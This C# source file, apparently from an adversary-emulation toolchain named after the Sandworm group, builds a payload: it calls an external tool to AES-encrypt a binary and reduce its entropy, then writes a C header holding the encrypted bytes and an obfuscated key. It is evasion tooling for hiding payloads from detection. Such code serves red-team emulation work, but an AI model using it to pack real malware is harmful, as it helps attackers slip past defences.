using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace sandworm_payload_builder
{
    class Program
    {
        static void Main(string[] args)
        {
            string payloadFile = args[0];

            string obfuscatedPayloadFile = args[1];

            string keyFile = args[2];

            string payloadIncludeFile = args[3];

            CreateObfuscatedPayload(payloadFile, obfuscatedPayloadFile, keyFile);

            CreatePayloadHeader(obfuscatedPayloadFile, keyFile, payloadIncludeFile);
        }

        static private bool CreateObfuscatedPayload(string payloadFile, string obfuscatedPayloadFile, string keyFile)
        {
            String command = String.Format(@"--aes --entropy-reduce {0} {1} {2}", payloadFile, obfuscatedPayloadFile, keyFile);

            ProcessStartInfo psi = new ProcessStartInfo(@"..\..\..\bin2mess\build\Win32\Release\bin2mess.exe");

            psi.Arguments = command;

            Process cmd = Process.Start(psi);

            cmd.WaitForExit();

            return true;
        }

        static private bool CreatePayloadHeader(string obfuscatedPayloadFile, string keyFile, string headerFile)
        {
            byte[] payload = File.ReadAllBytes(obfuscatedPayloadFile);

            byte[] key = File.ReadAllBytes(keyFile);

            StreamWriter writer = new StreamWriter(headerFile);

            // Prolog
            writer.WriteLine("#pragma once");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            writer.WriteLine("#include <stdint.h>");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            // Key
            StringBuilder hexKey = new StringBuilder();

            foreach (byte b in key)
            {
                hexKey.AppendFormat("{0:x2}", b);
            }

            writer.WriteLine("#define X_PAYLOAD_KEY\tX_OBFUSCATED_STRING_A(\"{0}\")", hexKey.ToString());

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            // Payload
            StringBuilder hexPayload = new StringBuilder();

            int last = payload.Count() - 1;

            for (int i = 0; i <= last; i++)
            {
                bool newline = (i + 1) % 8 == 0;

                bool indent = i % 8 == 0;

                if (indent)
                {
                    hexPayload.Append("\t");
                }

                hexPayload.AppendFormat("0x{0:x2}", payload[i]);

                if (i != last)
                {
                    hexPayload.Append(", ");

                    if (newline)
                    {
                        hexPayload.Append(Environment.NewLine);
                    }
                }
            }

            writer.WriteLine("static const uint8_t* s_payload =");

            writer.WriteLine("{");

            writer.WriteLine(hexPayload.ToString());

            writer.WriteLine("};");

            writer.Close();

            return true;
        }
    }
}
